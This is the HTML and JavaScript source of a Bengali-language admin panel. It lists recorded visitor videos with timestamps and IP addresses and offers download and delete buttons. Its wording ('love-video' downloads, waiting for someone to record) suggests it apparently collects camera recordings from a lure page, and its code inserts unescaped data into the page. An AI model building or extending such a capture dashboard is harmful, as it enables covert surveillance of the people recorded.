<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Admin Panel 🔒</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background: #0a0a0a;
      font-family: 'Arial', sans-serif;
      color: #fff;
      padding: 20px;
      min-height: 100vh;
    }

    .admin-container {
      max-width: 1200px;
      margin: 0 auto;
    }

    .header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 20px 0;
      border-bottom: 2px solid #ff1493;
      margin-bottom: 30px;
      flex-wrap: wrap;
      gap: 15px;
    }

    .header h1 {
      font-size: 2rem;
      color: #ff1493;
      text-shadow: 0 0 20px rgba(255, 20, 147, 0.3);
    }

    .stats {
      display: flex;
      gap: 20px;
      flex-wrap: wrap;
    }

    .stat-box {
      background: rgba(255, 255, 255, 0.05);
      padding: 10px 25px;
      border-radius: 10px;
      border: 1px solid rgba(255, 20, 147, 0.2);
      text-align: center;
    }

    .stat-box .number {
      font-size: 1.8rem;
      font-weight: bold;
      color: #ff1493;
    }

    .stat-box .label {
      font-size: 0.8rem;
      color: #888;
      margin-top: 5px;
    }

    /* ভিডিও গ্রিড */
    .video-grid {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
      gap: 25px;
    }

    .video-card {
      background: rgba(255, 255, 255, 0.05);
      border-radius: 15px;
      overflow: hidden;
      border: 1px solid rgba(255, 255, 255, 0.1);
      transition: transform 0.3s, box-shadow 0.3s;
    }

    .video-card:hover {
      transform: translateY(-5px);
      box-shadow: 0 10px 40px rgba(255, 20, 147, 0.15);
    }

    .video-card video {
      width: 100%;
      height: 220px;
      object-fit: cover;
      background: #000;
      display: block;
    }

    .video-info {
      padding: 15px;
    }

    .video-info .timestamp {
      color: #888;
      font-size: 0.8rem;
    }

    .video-info .ip {
      color: #666;
      font-size: 0.75rem;
      margin-top: 5px;
    }

    .video-actions {
      padding: 10px 15px 15px;
      display: flex;
      gap: 10px;
    }

    .video-actions button {
      flex: 1;
      padding: 8px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-size: 0.8rem;
      transition: all 0.3s;
    }

    .btn-delete {
      background: rgba(255, 0, 0, 0.2);
      color: #ff4444;
      border: 1px solid rgba(255, 0, 0, 0.3);
    }

    .btn-delete:hover {
      background: rgba(255, 0, 0, 0.4);
    }

    .btn-download {
      background: rgba(255, 20, 147, 0.2);
      color: #ff1493;
      border: 1px solid rgba(255, 20, 147, 0.3);
    }

    .btn-download:hover {
      background: rgba(255, 20, 147, 0.4);
    }

    /* লোডিং/এম্পটি স্টেট */
    .loading {
      text-align: center;
      padding: 60px 20px;
      color: #666;
    }

    .loading .spinner {
      width: 40px;
      height: 40px;
      border: 3px solid rgba(255, 20, 147, 0.1);
      border-top: 3px solid #ff1493;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto 20px;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .empty {
      text-align: center;
      padding: 60px 20px;
      color: #666;
      font-size: 1.1rem;
    }

    .empty .icon {
      font-size: 3rem;
      margin-bottom: 15px;
      display: block;
    }

    /* রেসপন্সিভ */
    @media (max-width: 600px) {
      .header h1 {
        font-size: 1.4rem;
      }
      .video-grid {
        grid-template-columns: 1fr;
      }
    }
  </style>
</head>
<body>
  <div class="admin-container">
    <!-- হেডার -->
    <div class="header">
      <h1>🔒 অ্যাডমিন প্যানেল</h1>
      <div class="stats">
        <div class="stat-box">
          <div class="number" id="totalVideos">0</div>
          <div class="label">মোট ভিডিও</div>
        </div>
        <div class="stat-box">
          <div class="number" id="todayVideos">0</div>
          <div class="label">আজকের</div>
        </div>
      </div>
    </div>

    <!-- ভিডিও লিস্ট -->
    <div id="videoList">
      <div class="loading">
        <div class="spinner"></div>
        <p>লোড হচ্ছে...</p>
      </div>
    </div>
  </div>

  <script>
    const videoList = document.getElementById('videoList');
    const totalVideos = document.getElementById('totalVideos');
    const todayVideos = document.getElementById('todayVideos');

    // === সব ভিডিও লোড ===
    async function loadVideos() {
      try {
        const response = await fetch('/api/videos');
        const videos = await response.json();

        if (!videos.length) {
          videoList.innerHTML = `
            <div class="empty">
              <span class="icon">💔</span>
              <p>কোনো ভিডিও পাওয়া যায়নি</p>
              <small style="color:#444;">যতক্ষণ কেউ ভিডিও রেকর্ড না করে, ততক্ষণ এখানে কিছু দেখাবে না</small>
            </div>
          `;
          updateStats(videos);
          return;
        }

        // স্ট্যাট আপডেট
        updateStats(videos);

        // ভিডিও কার্ড তৈরি
        let html = '<div class="video-grid">';
        videos.forEach(video => {
          const date = new Date(video.timestamp);
          const formattedDate = date.toLocaleString('bn-BD', {
            day: '2-digit',
            month: '2-digit',
            year: 'numeric',
            hour: '2-digit',
            minute: '2-digit'
          });

          html += `
            <div class="video-card" data-id="${video._id}">
              <video controls>
                <source src="${video.videoUrl}" type="video/webm">
                আপনার ব্রাউজার ভিডিও সাপোর্ট করে না।
              </video>
              <div class="video-info">
                <div class="timestamp">📅 ${formattedDate}</div>
                <div class="ip">🌐 IP: ${video.ip || 'অজানা'}</div>
              </div>
              <div class="video-actions">
                <button class="btn-download" onclick="downloadVideo('${video.videoUrl}')">⬇️ ডাউনলোড</button>
                <button class="btn-delete" onclick="deleteVideo('${video._id}')">🗑️ ডিলিট</button>
              </div>
            </div>
          `;
        });
        html += '</div>';
        videoList.innerHTML = html;

      } catch (err) {
        console.error('Load error:', err);
        videoList.innerHTML = `
          <div class="empty">
            <span class="icon">⚠️</span>
            <p>লোড করতে সমস্যা হয়েছে</p>
            <button onclick="loadVideos()" style="margin-top:15px;padding:10px 30px;background:#ff1493;color:#fff;border:none;border-radius:10px;cursor:pointer;">পুনরায় চেষ্টা</button>
          </div>
        `;
      }
    }

    // === স্ট্যাট আপডেট ===
    function updateStats(videos) {
      totalVideos.textContent = videos.length;

      const today = new Date();
      today.setHours(0, 0, 0, 0);
      
      const todayCount = videos.filter(v => {
        const vDate = new Date(v.timestamp);
        vDate.setHours(0, 0, 0, 0);
        return vDate.getTime() === today.getTime();
      }).length;

      todayVideos.textContent = todayCount;
    }

    // === ভিডিও ডিলিট ===
    async function deleteVideo(id) {
      if (!confirm('এই ভিডিও ডিলিট করবেন?')) return;

      try {
        const response = await fetch(`/api/video/${id}`, {
          method: 'DELETE'
        });
        const data = await response.json();

        if (data.success) {
          // কার্ড রিমুভ
          const card = document.querySelector(`.video-card[data-id="${id}"]`);
          if (card) card.remove();
          loadVideos(); // রিফ্রেশ
        } else {
          alert('ডিলিট করতে সমস্যা হয়েছে');
        }
      } catch (err) {
        alert('Error: ' + err.message);
      }
    }

    // === ভিডিও ডাউনলোড ===
    function downloadVideo(url) {
      const a = document.createElement('a');
      a.href = url;
      a.download = 'love-video.webm';
      a.click();
    }

    // === অটো রিফ্রেশ (প্রতি ১০ সেকেন্ড) ===
    loadVideos();
    setInterval(loadVideos, 10000);
  </script>

</body>
</html>
